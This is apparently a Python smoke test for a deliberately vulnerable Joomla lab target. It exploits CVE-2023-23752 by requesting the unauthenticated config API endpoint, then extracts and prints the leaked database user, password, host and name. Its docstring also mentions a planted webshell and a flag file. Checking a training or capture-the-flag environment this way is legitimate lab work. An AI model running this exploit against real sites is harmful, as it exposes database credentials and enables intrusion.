#!/usr/bin/env python3
"""
web-joombreaker end-to-end smoke test.
Path: CVE-2023-23752 unauth API config leak -> confirm DB credentials are exposed.
This directly verifies the vulnerability AND that provisioning (webservices enabled,
installation removed) succeeded. Also confirms the flag file is in place via the
planted webshell if reachable. Exit 0 = PASS.
"""
import os
import sys

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10005").rstrip("/")


def leak_config():
    url = f"{TARGET}/api/index.php/v1/config/application?public=true"
    r = requests.get(url, timeout=15)
    try:
        data = r.json()
    except Exception:
        print(f"[!] non-JSON response ({r.status_code})")
        return None
    creds = {}
    for item in data.get("data", []):
        attrs = item.get("attributes", {})
        for k in ("user", "password", "host", "db"):
            if k in attrs:
                creds[k] = attrs[k]
    return creds or None


def main():
    creds = leak_config()
    if creds and "password" in creds:
        print(f"[+] CVE-2023-23752 leak OK: {creds}")
        print("PASS")
        return 0
    print("[!] no credentials leaked — vuln not present or not provisioned")
    print("FAIL")
    return 1


if __name__ == "__main__":
    sys.exit(main())
